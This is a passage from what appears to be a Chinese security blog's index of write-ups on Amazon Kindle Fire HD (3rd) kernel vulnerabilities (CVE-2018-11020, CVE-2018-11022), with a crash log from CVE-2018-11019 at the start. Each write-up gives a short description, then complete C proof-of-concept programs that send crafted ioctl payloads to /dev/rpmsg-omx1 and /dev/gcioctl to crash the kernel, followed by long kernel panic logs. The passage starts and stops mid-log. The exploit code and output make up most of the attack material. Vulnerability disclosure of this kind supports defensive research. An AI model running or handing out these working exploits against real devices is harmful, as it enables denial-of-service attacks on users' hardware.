(sys_read+0x40/0x78)[ 166.065093] r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000[ 166.073547] [&lt;c0125998&gt;] (sys_read+0x0/0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 166.082855] r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010[ 166.091217] CPU0 PC (0) : 0xc0019b2c[ 166.095397] CPU0 PC (1) : 0xc0019b2c[ 166.099456] CPU0 PC (2) : 0xc0019b2c[ 166.103515] CPU0 PC (3) : 0xc0019b2c[ 166.107574] CPU0 PC (4) : 0xc0019b2c[ 166.111785] CPU0 PC (5) : 0xc0019b2c[ 166.115814] CPU0 PC (6) : 0xc0019b2c[ 166.119873] CPU0 PC (7) : 0xc0019b2c[ 166.124084] CPU0 PC (8) : 0xc0019b2c[ 166.128112] CPU0 PC (9) : 0xc0019b2c[ 166.132171] CPU1 PC (0) : 0xc003ee38[ 166.136352] CPU1 PC (1) : 0xc003ee54[ 166.140411] CPU1 PC (2) : 0xc003ee54[ 166.144470] CPU1 PC (3) : 0xc003ee54[ 166.148681] CPU1 PC (4) : 0xc003ee54[ 166.152709] CPU1 PC (5) : 0xc003ee54[ 166.156768] CPU1 PC (6) : 0xc003ee54[ 166.160980] CPU1 PC (7) : 0xc003ee54[ 166.165008] CPU1 PC (8) : 0xc003ee54[ 166.169067] CPU1 PC (9) : 0xc003ee54[ 166.173126] [ 166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[ 166.175079]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11019%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/rpmsg/rpmsg_omx.c允许攻击者通过设备文件/ dev / rpmsg-上的ioctl的参数注入特制的参数使用命令3221772291的omx1，并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / rpmsg-omx1，并使用命令3221772291和精心设计的有效负载作为第三个参数来对该设备文件进行ioctl系统调用。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc 123456789101112131415161718192021222324252627282930313233343536373839/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291. * Related buggy struct name is gcicommit. * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1. * * The fowllwing is kmsg of kernel crash infomation: * * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/rpmsg-omx1&quot;;static command = 3221772291; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 }; int fd = 0; fd = open(driver, O_RDWR); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try open %s with command 0x%x.\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241[ 146.290710] Unable to handle kernel paging request at virtual address b5d18de6[ 146.299438] pgd = d72dc000[ 146.302795] [b5d18de6] *pgd=00000000[ 146.307281] Internal error: Oops: 5 [#1] PREEMPT SMP ARM[ 146.313232] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[ 146.320983] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1)[ 146.328308] PC is at ion_free+0xc/0xb4[ 146.332672] LR is at rpmsg_omx_ioctl+0x2cc/0x598[ 146.337890] pc : [&lt;c02e8540&gt;] lr : [&lt;c048a120&gt;] psr: 60000013[ 146.337890] sp : c35b5e60 ip : c35b5e80 fp : c35b5e7c[ 146.350860] r10: c35b5ea8 r9 : de88c4d8 r8 : c35b4000[ 146.356872] r7 : dd32b580 r6 : 00000003 r5 : d71d5880 r4 : be92f5f8[ 146.364135] r3 : d71d58ec r2 : d71d58ec r1 : b5d18de2 r0 : d7aaaa00[ 146.371551] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user[ 146.379516] Control: 10c5387d Table: 972dc04a DAC: 00000015[ 146.386077] [ 146.386077] PC: 0xc02e84c0:[ 146.391052] 84c0 0a000001 e2871010 ebfddc25 e1a00006 eb0ee904 e5953058 e2433001 e5853058[ 146.401580] 84e0 e3530000 ba000011 1a000009 e1a0200d e3c23d7f e3c3303f e285005c e593300c[ 146.412292] 8500 e593723c e1a01007 ebf90a76 e597321c e585306c e1a00006 eb0ee876 e1a00005[ 146.422821] 8520 ebffffb4 e1a00004 ebf8e011 e89da8f0 e7f001f2 e1a0c00d e92dd878 e24cb004[ 146.433502] 8540 e5915004 e1a04001 e1550000 1a000021 e2856014 e1a00006 eb0ee8e2 e5953010[ 146.444183] 8560 e3530000 0a000005 e243200c e1540002 2a00000a e5933008 e3530000 1afffff9[ 146.454864] 8580 e59f0054 e3001219 e59f2050 e59f3050 ebf58268 e1a00006 eb0ee856 e89da878[ 146.465393] 85a0 85933004 8affffed f57ff05f e1943f9f e2433001 e1842f93 e3320000 1afffffa[ 146.476074] [ 146.476074] LR: 0xc048a0a0:[ 146.481048] a0a0 33a03000 e3530000 1affffae e24ba05c e1a01004 e3a02008 e1a0000a ebf7305e[ 146.491729] a0c0 e3500000 1affffaa e5950068 e51b1058 ebf97677 e3500000 e50b005c 0a000001[ 146.502380] a0e0 e3700a01 9affffc8 e3a03000 e50b305c eaffffc5 e3e00018 eaffff8e e1a00004[ 146.513061] a100 e1a0100a e3a02008 ebf73154 e3500000 0affff88 eaffffc2 e5950068 ebf97904[ 146.523590] a120 eaffffb9 e24b005c e3a01030 ebf7398b e3a02030 e597003c e1a03006 e58d2000[ 146.534240] a140 e59f1280 e59f2274 ebf99069 e3e0000d eaffff78 e5933004 e7933101 e3530000[ 146.544921] a160 0affff6c e5950068 ebf97651 e2509000 0a000021 e3790a01 8a00001f e5950068[ 146.555603] a180 e1a01009 e24b2064 e24b3060 ebf97447 e3500000 050b905c 0affff9b e59f322c[ 146.566131] [ 146.566131] SP: 0xc35b5de0:[ 146.571228] 5de0 00000004 d8cc50f4 60010013 00000001 00000001 c02e8540 60000013 ffffffff[ 146.581787] 5e00 c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2[ 146.592437] 5e20 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8[ 146.603118] 5e40 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff[ 146.613830] 5e60 d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540[ 146.624389] 5e80 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8[ 146.635070] 5ea0 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14[ 146.645599] 5ec0 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000[ 146.656158] [ 146.656158] IP: 0xc35b5e00:[ 146.661254] 5e00 c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2[ 146.671936] 5e20 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8[ 146.682495] 5e40 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff[ 146.693176] 5e60 d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540[ 146.703704] 5e80 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8[ 146.714263] 5ea0 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14[ 146.724914] 5ec0 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000[ 146.735595] 5ee0 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08[ 146.746276] [ 146.746276] FP: 0xc35b5dfc:[ 146.751251] 5dfc ffffffff c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00[ 146.761779] 5e1c b5d18de2 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000[ 146.772308] 5e3c de88c4d8 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013[ 146.783020] 5e5c ffffffff d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120[ 146.793701] 5e7c c02e8540 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4[ 146.804382] 5e9c c35b5ea8 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000[ 146.814941] 5ebc c35b5f14 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc[ 146.825592] 5edc 00000000 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74[ 146.836242] [ 146.836242] R0: 0xd7aaa980:[ 146.841217] a980 00000001 00000001 00000000 00000000 00004007 00000000 00000000 00000000[ 146.851898] a9a0 00000020 00000000 00000000 00000000 00000300 d7aaa9b4 d7aaa9b4 c0248d00[ 146.862518] a9c0 00000093 00000093 0000005d 00000002 00000000 00000000 00000000 00000000[ 146.873077] a9e0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 146.883728] aa00 d763b780 00000000 00000000 deabb480 00000000 00000001 00000000 00000000[ 146.894409] aa20 d7aaaa20 d7aaaa20 00000000 00000105 c0903054 d7157440 00000f30 dcd4f220[ 146.905090] aa40 00000093 00000003 00000017 00000000 00000000 00000000 00000000 00000000[ 146.915618] aa60 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 146.926300] [ 146.926300] R2: 0xd71d586c:[ 146.931274] 586c 00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580[ 146.941955] 588c d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000[ 146.952636] 58ac d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000[ 146.963287] 58cc 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00[ 146.973815] 58ec d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904[ 146.984497] 590c 00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000[ 146.995147] 592c 00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000[ 147.005676] 594c 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 147.016357] [ 147.016357] R3: 0xd71d586c:[ 147.021453] 586c 00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580[ 147.032012] 588c d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000[ 147.042663] 58ac d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000[ 147.053314] 58cc 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00[ 147.063873] 58ec d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904[ 147.074523] 590c 00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000[ 147.085205] 592c 00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000[ 147.095886] 594c 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 147.106414] [ 147.106445] R5: 0xd71d5800:[ 147.111541] 5800 d71d5d00 00000000 00000000 dcfc4200 f0000009 00000211 00000001 00000001[ 147.122070] 5820 00000000 00001000 00001000 00000004 00000000 d71d5844 c01519dc d89b54c0[ 147.132751] 5840 c01576ac c10dc870 00001000 00000000 c0a10230 c0a10dc0 d1a1dd58 c006f724[ 147.143432] 5860 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 147.154083] 5880 dd32b5c8 dd32b5c8 dd32b580 d71d588c d71d588c 00000000 00000000 00000000[ 147.164611] 58a0 00000001 00000000 00000000 d71d58ac d71d58ac 00000000 00000000 00000000[ 147.175140] 58c0 d71d58c0 d71d58c0 00000000 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0[ 147.185821] 58e0 00000000 00000000 d7aaaa00 d71d58ec d71d58ec 00000000 00000000 00000000[ 147.196472] [ 147.196502] R7: 0xdd32b500:[ 147.201446] b500 e2401000 f400f000 0202420f 0000c000 f400f000 dd071d20 00000000 d8f0a680[ 147.212127] b520 d8f0a740 00000000 00000000 00000001 00000000 00000000 00000000 00000000[ 147.222656] b540 00000000 00000000 00000001 00000000 00000000 00000000 00000000 00000000[ 147.233184] b560 00000000 00000000 c153f430 00001000 00000000 00000000 00000000 00000000[ 147.243865] b580 00000000 dd32b584 dd32b584 00000000 00000000 c0a16c60 00000000 00000002[ 147.254547] b5a0 00000001 00000000 c06faab0 de88c61c de88c61c 0f700001 00000001 d8caa000[ 147.265075] b5c0 dd0f7200 00000001 d71d5880 d71d5880 00000001 00000000 00000000 dd32b5dc[ 147.275756] b5e0 dd32b5dc 00000000 7fffffff 00000000 00000000 dd32b5f4 dd32b5f4 00000000[ 147.286407] [ 147.286407] R8: 0xc35b3f80:[ 147.291381] 3f80 66eff968 00000000 000000f0 c0013e08 c35b2000 00000000 00000000 c35b3fa8[ 147.302032] 3fa0 c0013c60 c009a164 66eff978 66eff968 66eff978 00000080 00000000 00000000[ 147.312713] 3fc0 66eff978 66eff968 00000000 000000f0 00000000 00000000 00000000 41d1f6a8[ 147.323272] 3fe0 00000000 6716ebc8 400710f8 40083b80 600f0010 66eff978 00760061 00000061[ 147.333923] 4000 00000000 00000002 00000000 d7157440 c0a0e840 00000000 00000015 d726ee00[ 147.344604] 4020 d8d2c700 c35b4000 c09ddc50 d7157440 d8db57c0 c1617b40 c35b5b4c c35b5a98[ 147.355133] 4040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000[ 147.365814] 4060 0087d4c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000[ 147.376464] [ 147.376495] R9: 0xde88c458:[ 147.381469] c458 de88c458 de88c458 00000000 00000000 00000000 c06bc674 000200da c09dda58[ 147.392150] c478 00000000 00000000 de88c480 de88c480 00000000 de88c48c de88c48c 00000000[ 147.402801] c498 5aefcde6 00000000 00000000 00000000 de88c4b0 28cfd730 00000000 00000000[ 147.413330] c4b8 00200000 00000000 00000000 de88c4c4 de88c4c4 d8cbdf00 d8cbdf00 00000000[ 147.424011] c4d8 000521b0 00000402 00000402 00000000 00000000 00000000 c06b9600 dd160400[ 147.434661] c4f8 de88c5b0 d8c81030 00000f98 00000001 0f700001 5aefcde6 199c82ca 5aefcde6[ 147.445312] c518 199c82ca 5aefcde6 199c82ca 00000000 00000000 00000000 00000000 00000000[ 147.455871] c538 00000000 00000000 00000000 00000000 00000001 00000000 00000000 de88c554[ 147.466522] [ 147.466522] R10: 0xc35b5e28:[ 147.471588] 5e28 be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 c35b5ea8 c35b5e7c[ 147.482269] 5e48 c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff d71d58ec be92f5f8[ 147.492950] 5e68 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 c35b5edc c35b5e90[ 147.503631] 5e88 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 c00723a0 000fffff[ 147.514160] 5ea8 b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 00000000 00000001[ 147.524688] 5ec8 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 d72400c0 00000004[ 147.535339] 5ee8 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 c0136044 c0489e60[ 147.546020] 5f08 00000000 00000000 00000000 00000001 00000000 dd055190 dd5e7f68 c35b5f0c[ 147.556579] Process rpmsg_omx_ioctl (pid: 3888, stack limit = 0xc35b42f8)[ 147.564270] Stack: (0xc35b5e60 to 0xc35b6000)[ 147.569213] 5e60: d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540[ 147.578430] 5e80: c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8[ 147.587646] 5ea0: c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14[ 147.596740] 5ec0: 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000[ 147.605957] 5ee0: d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08[ 147.615173] 5f00: c0136044 c0489e60 00000000 00000000 00000000 00000001 00000000 dd055190[ 147.624389] 5f20: dd5e7f68 c35b5f0c c35b4000 be92f628 be92f5f8 c0085803 d72400c0 00000004[ 147.633483] 5f40: c35b4000 00000000 c35b5f64 00000000 be92f5f8 c0085803 d72400c0 00000004[ 147.642730] 5f60: c35b4000 00000000 c35b5fa4 c35b5f78 c01365e0 c0135fc4 00000000 00000000[ 147.651947] 5f80: 00000400 be92f628 00010e54 00000000 00000036 c0013e08 00000000 c35b5fa8[ 147.661010] 5fa0: c0013c60 c0136578 be92f628 00010e54 00000004 c0085803 be92f5f8 be92f5f8[ 147.670104] 5fc0: be92f628 00010e54 00000000 00000036 00000000 00000000 00000000 be92f614[ 147.679321] 5fe0: 00000000 be92f5dc 00010690 0002917c 60000010 00000004 00000017 579e6e78[ 147.688537] Backtrace: [ 147.691558] [&lt;c02e8534&gt;] (ion_free+0x0/0xb4) from [&lt;c048a120&gt;] (rpmsg_omx_ioctl+0x2cc/0x598)[ 147.701049] r6:00000003 r5:d71d5880 r4:be92f5f8 r3:d71d58ec[ 147.708068] [&lt;c0489e54&gt;] (rpmsg_omx_ioctl+0x0/0x598) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[ 147.717956] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[ 147.727203] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 147.736450] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:be92f628[ 147.744873] Code: e7f001f2 e1a0c00d e92dd878 e24cb004 (e5915004) [ 147.754913] Board Information: [ 147.754913] Revision : 0001[ 147.754943] Serial : 0000000000000000[ 147.754943] SoC Information:[ 147.754943] CPU : OMAP4470[ 147.754943] Rev : ES1.0[ 147.754974] Type : HS[ 147.754974] Production ID: 0002B975-000000CC[ 147.754974] Die ID : 1CC60000-50002FFF-0B00935D-11007004[ 147.755004] [ 147.794616] ---[ end trace 50912198cfc81720 ]---[ 147.799957] Kernel panic - not syncing: Fatal exception[ 147.805847] CPU0: stopping[ 147.808959] Backtrace: [ 147.812133] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[ 147.821502] r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950[ 147.828643] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[ 147.837860] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[ 147.847259] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)[ 147.856567] Exception stack(0xdd187b38 to 0xdd187b80)[ 147.862243] 7b20: 00000002 00000002[ 147.871459] 7b40: 00000002 00000001 dd187bbc c1621100 c1621100 00c6a000 c1621108 00000001[ 147.880676] 7b60: 00000001 dd187bac 00000002 dd187b80 c002398c c009ae48 200d0013 ffffffff[ 147.889892] r6:ffffffff r5:200d0013 r4:c009ae48 r3:c002398c[ 147.896911] [&lt;c009add0&gt;] (generic_exec_single+0x0/0x98) from [&lt;c009af78&gt;] (smp_call_function_single+0x110/0x1e0)[ 147.908325] [&lt;c009ae68&gt;] (smp_call_function_single+0x0/0x1e0) from [&lt;c009b28c&gt;] (smp_call_function_many+0x244/0x294)[ 147.920104] [&lt;c009b048&gt;] (smp_call_function_many+0x0/0x294) from [&lt;c009b48c&gt;] (smp_call_function+0x48/0x74)[ 147.931030] [&lt;c009b444&gt;] (smp_call_function+0x0/0x74) from [&lt;c04310f4&gt;] (cpuidle_latency_notify+0x20/0x28)[ 147.941864] r4:ffffffff r3:c04310d4[ 147.946258] [&lt;c04310d4&gt;] (cpuidle_latency_notify+0x0/0x28) from [&lt;c06a7154&gt;] (notifier_call_chain+0x4c/0x8c)[ 147.957305] [&lt;c06a7108&gt;] (notifier_call_chain+0x0/0x8c) from [&lt;c006ebc0&gt;] (__blocking_notifier_call_chain+0x50/0x68)[ 147.969085] r8:200d0013 r7:000000a0 r6:00000000 r5:ffffffff r4:c0a11df8[ 147.977020] r3:ffffffff[ 147.980499] [&lt;c006eb70&gt;] (__blocking_notifier_call_chain+0x0/0x68) from [&lt;c006ebf8&gt;] (blocking_notifier_call_chain+0x20/0x28)[ 147.993133] r7:de95183c r6:000000a0 r5:0000115c r4:c0a11d98[ 148.000152] [&lt;c006ebd8&gt;] (blocking_notifier_call_chain+0x0/0x28) from [&lt;c0088eec&gt;] (pm_qos_update_target+0xf8/0x19c)[ 148.011932] [&lt;c0088df4&gt;] (pm_qos_update_target+0x0/0x19c) from [&lt;c008909c&gt;] (pm_qos_update_request+0x5c/0x8c)[ 148.023071] [&lt;c0089040&gt;] (pm_qos_update_request+0x0/0x8c) from [&lt;c0411b18&gt;] (omap_i2c_xfer+0x2bc/0x6c8)[ 148.033599] r5:dd187da0 r4:00000000[ 148.038024] [&lt;c041185c&gt;] (omap_i2c_xfer+0x0/0x6c8) from [&lt;c040e5cc&gt;] (i2c_transfer+0xb8/0xf8)[ 148.047637] [&lt;c040e514&gt;] (i2c_transfer+0x0/0xf8) from [&lt;c040e930&gt;] (i2c_smbus_xfer+0x278/0x588)[ 148.057434] [&lt;c040e6b8&gt;] (i2c_smbus_xfer+0x0/0x588) from [&lt;c040eedc&gt;] (i2c_smbus_read_word_data+0x3c/0x4c)[ 148.068267] [&lt;c040eea0&gt;] (i2c_smbus_read_word_data+0x0/0x4c) from [&lt;c0418760&gt;] (bq27541_i2c_read.constprop.7+0x20/0x54)[ 148.080200] [&lt;c0418740&gt;] (bq27541_i2c_read.constprop.7+0x0/0x54) from [&lt;c04189f0&gt;] (battery_handle_work+0x120/0x6a4)[ 148.091857] r5:dd187e92 r4:dd08b920[ 148.096374] [&lt;c04188d0&gt;] (battery_handle_work+0x0/0x6a4) from [&lt;c0063278&gt;] (process_one_work+0x150/0x468)[ 148.107116] [&lt;c0063128&gt;] (process_one_work+0x0/0x468) from [&lt;c00638c4&gt;] (worker_thread+0x13c/0x320)[ 148.117156] [&lt;c0063788&gt;] (worker_thread+0x0/0x320) from [&lt;c0068af4&gt;] (kthread+0x90/0x9c)[ 148.126312] [&lt;c0068a64&gt;] (kthread+0x0/0x9c) from [&lt;c004cd64&gt;] (do_exit+0x0/0x7e0)[ 148.134765] r6:c004cd64 r5:c0068a64 r4:dd0aded4[ 148.140533] CPU0 PC (0) : 0xc0019b2c[ 148.144714] CPU0 PC (1) : 0xc0019b2c[ 148.148773] CPU0 PC (2) : 0xc0019b2c[ 148.152832] CPU0 PC (3) : 0xc0019b2c[ 148.156890] CPU0 PC (4) : 0xc0019b2c[ 148.161071] CPU0 PC (5) : 0xc0019b2c[ 148.165130] CPU0 PC (6) : 0xc0019b2c[ 148.169189] CPU0 PC (7) : 0xc0019b2c[ 148.173370] CPU0 PC (8) : 0xc0019b2c[ 148.177429] CPU0 PC (9) : 0xc0019b2c[ 148.181488] CPU1 PC (0) : 0xc003ee38[ 148.185668] CPU1 PC (1) : 0xc003ee54[ 148.189727] CPU1 PC (2) : 0xc003ee54[ 148.193786] CPU1 PC (3) : 0xc003ee54[ 148.197967] CPU1 PC (4) : 0xc003ee54[ 148.202026] CPU1 PC (5) : 0xc003ee54[ 148.206085] CPU1 PC (6) : 0xc003ee54[ 148.210266] CPU1 PC (7) : 0xc003ee54[ 148.214324] CPU1 PC (8) : 0xc003ee54[ 148.218383] CPU1 PC (9) : 0xc003ee54[ 148.222442] [ 148.224365] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[ 148.224365]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11020%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11022）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 mazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3224132973，并导致内核崩溃。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3224132973. * Related buggy struct name is gcicommit. * This Poc should run with permission to do ioctl on /dev/gcioctl. * * The fowllwing is kmsg of kernel crash infomation: * * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/gcioctl&quot;;static command = 3224132973; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0x00002020, 0x00000002, 0x00000002, 0xeddad33f, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0xf16c7d8e, 0x96489dd1, 0x678a12ff, 0x69812204, 0x41414141, 0x41414141, 0x41414141, 0x41414141 }; int fd = 0; fd = open(driver, O_RDWR); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try open %s with command 0x%x.\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227[ 381.205780] Unable to handle kernel NULL pointer dereference at virtual address 00000004[ 381.215637] pgd = c30e4000[ 381.219085] [00000004] *pgd=97437831, *pte=00000000, *ppte=00000000[ 381.227355] Internal error: Oops: 817 [#1] PREEMPT SMP ARM[ 381.233520] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[ 381.241302] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1)[ 381.248596] PC is at free_buffer+0x4c/0x13c[ 381.253479] LR is at down_timeout+0x40/0x5c[ 381.258209] pc : [&lt;c031716c&gt;] lr : [&lt;c006e9b8&gt;] psr: a0000013[ 381.258209] sp : de943e58 ip : de943e38 fp : de943e6c[ 381.271179] r10: 00000000 r9 : dd3e8ca8 r8 : c25e6598[ 381.277160] r7 : eddad327 r6 : de942000 r5 : c0a25b50 r4 : c25e6580[ 381.284454] r3 : 00000000 r2 : c0a25b64 r1 : c0a25b64 r0 : 00000000[ 381.291870] Flags: NzCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user[ 381.299804] Control: 10c5387d Table: 830e404a DAC: 00000015[ 381.306335] [ 381.306365] PC: 0xc03170ec:[ 381.311340] 70ec e1a00001 e34c2091 e3a01a01 e30531e8 e34c306e ebfd3650 e89da800 